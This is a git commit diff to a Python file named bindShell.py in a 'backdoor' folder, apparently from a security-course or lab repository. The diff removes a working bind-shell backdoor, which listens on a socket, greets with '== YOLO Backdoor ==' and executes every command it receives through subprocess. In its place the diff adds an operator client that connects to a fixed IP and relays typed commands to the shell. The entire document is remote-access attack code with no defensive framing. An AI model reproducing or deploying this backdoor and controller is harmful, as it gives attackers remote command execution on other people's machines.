f16e1fee50fb70103c7b2ee50dcf41c2d64ac167
john-bush <johncbus@usc.edu>
2023-03-23 17:33:19 -0700

    changed bindshell?

--- backdoor/bindShell.py
+++ backdoor/bindShell.py
@@ -1,20 +1,28 @@
-import sys,socket,time,re,subprocess,os
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-sock.bind(('1.1.1.5',sys.argv[1]))
-sock.listen(5)
-conn,addr = sock.accept()
-conn.send('== YOLO Backdoor ==\n\n>')
-while 1:         
-    data = conn.recv(1024)
-    cmd = data.strip().split(' ')
-    if cmd[0] == 'cd':
-        os.chdir(cmd[1])
-    elif cmd[0] in ('exit'):
-        break
+#!/usr/bin/env python3
+import sys,socket,os
+ 
+# Enter IP address and port
+HOST = "1.1.1.5"
+PORT = int(sys.argv[1])
+# Configure socket connection
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.sendall('\nHowdy!\nEOFX'.encode())
+ 
+while True:
+    # Receive data
+    data = s.recv(1024)
+    # Check for end of command
+    if data.decode().endswith("EOFX") == True:
+        # Print data without 'EOFX'
+        print(data[:-4].decode())
+        # Get next command
+        nextcmd = input(": ")
+        # Send that $hit
+        if nextcmd == 'quit':
+            s.send(nextcmd.encode())
+            break
+        else: s.send(nextcmd.encode())
+    # If we haven't reach end of command, print
     else:
-        conn.send(subprocess.check_output(cmd)+'\n>') 
-conn.close()
-sock.shutdown(socket.SHUT_RDWR)
-sock.close()
+        print(data.decode())
